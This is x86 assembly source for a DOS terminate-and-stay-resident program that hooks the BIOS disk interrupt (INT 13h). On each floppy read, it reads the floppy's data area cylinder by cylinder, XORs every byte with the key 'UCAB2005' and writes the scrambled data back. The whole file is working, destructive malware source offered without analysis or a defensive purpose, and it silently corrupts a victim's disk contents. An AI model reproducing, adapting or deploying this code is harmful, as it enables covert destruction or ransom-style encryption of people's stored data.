page 60,132
.model small
.386

.data
.code

TSR_Start:


Old_INT13       dd      0
Cylinder	db	1
buffer 		db      512*36 dup(0)		;each Cylinder has 36 sectors


New_INT13:                                  



        pusha
	push    ds

	pusha
	pushf
        call    dword ptr [Old_INT13] 
	popa



	cmp ah,2
	jne Terminate 	;read request?

	cmp dl,0
	jne Terminate	;floppy?
			;only switch root dir upon floppy read request  
 
	
		push cs
		pop ds
		push ds
		pop es


		;read last 3 sectors of Cylinder 0 head 1
		mov ah,2	;read sectors from drive
		mov al,3	;read three sectors
		mov cl,16	;sector
		mov ch,0	;cylinder
		mov dh,1	;head
		mov dl,0	;drive

		mov bx,offset buffer    ;store in buffer

		pushf
		call    dword ptr [Old_INT13]    ;call old INT 13h
	  

		mov si,0
		mov cx,512*3/8


		;"encrypt" each byte by XORing 8byte strings with UCAB2005

		modify_dataCYL0:

		mov al,buffer[si]
		xor al,"U"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"C"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"A"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"B"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"2"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"0"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"0"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"5"
		mov buffer[si],al		
		inc si


		loop modify_dataCYL0

		

		mov ah,3	;write sectors to drive
		mov al,3	;3 sectors
		mov cl,16	;sector
		mov ch,0	;track
		mov dh,1	;head
		mov dl,0	;drive

		mov bx,offset buffer  ;data stored in buffer


		;now we do the same with the rest of data sectors in floppy

		pushf
		call    dword ptr [Old_INT13] ;write first three data sectors, cyl 0, head 1, sector 16,17,18


		mov [Cylinder],1		;modify Cylinders from 1 to 79
		mov si,0

	modify_data:


		mov ah,2		;read sectors
		mov al,36		;read 36 sectors
		mov cl,1		;sector number
		mov ch,[Cylinder]	;cylinder
		mov dh,0		;head
		mov dl,0		;drive

		mov bx,offset buffer 		;read one Cylinder at a time

		pushf
		call    dword ptr [Old_INT13] 	;call old INT 13h

		;"encrypt" each byte by XORing 8byte strings with UCAB2005

		do_xor:
		
		mov al,buffer[si]
		xor al,"U"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"C"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"A"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"B"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"2"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"0"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"0"
		mov buffer[si],al		
		inc si

		mov al,buffer[si]
		xor al,"5"
		mov buffer[si],al		
		inc si
		
		mov ax,512*36
		cmp si,ax		;end of cylinder?
		jne do_xor

		mov ah,3		;write cylinders
		mov al,36		;write 36 cylinders
		mov cl,1		;sector
		mov ch,[Cylinder]	;cylinder
		mov dh,0		;head
		mov dl,0		;drive

		mov bx,offset buffer  

		pushf
		call    dword ptr [Old_INT13] ;write whole Cylinder
		call delay		      ;wait until writting process is complete...


		mov si,0


		inc [Cylinder]
		cmp [Cylinder],80	;reached cylinder 80? it means we just wrote cylinder 79, bye.
		je Terminate
		jmp modify_data
		


	Terminate:

	 pop ds
	 popa


	 iret  

	delay:

	pusha
	mov cx,0
	lets_wait:	
	nop				;do nothing
	loop lets_wait

	popa
	ret


TSR_End:

Start:
        mov ax,@code
	push ax
	pop cx
	push    cs
        pop     ds

      

        mov     ax,3500h or 19               ;get old vector for interrupt 13h
        int     21h
        mov     word ptr [Old_INT13],bx         ;store
        mov     word ptr [Old_INT13 + 2],es

        mov     ax,2500h or 19             ;replace with new ISR
        mov     dx,offset New_INT13
        int     21h


      
        mov     dx,16 + (offset TSR_End - offset TSR_Start + 15)/16
        mov     ax,3100h                        ;terminate and stay resident
        int     21h
;-----------------------------------------------------------------------------
        end     Start
